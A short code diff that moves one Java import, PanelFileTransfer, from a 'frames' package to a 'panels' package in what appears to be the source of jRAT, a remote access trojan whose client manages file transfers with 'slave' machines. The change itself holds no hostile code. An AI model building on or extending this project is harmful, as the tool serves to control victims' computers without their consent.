@@ -5,7 +5,7 @@ import java.io.File;
 import java.io.FileInputStream;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.frames.PanelFileTransfer;
+import se.jrat.client.ui.panels.PanelFileTransfer;
 import se.jrat.common.TransferRunnable;
 import se.jrat.common.io.TransferData;
 
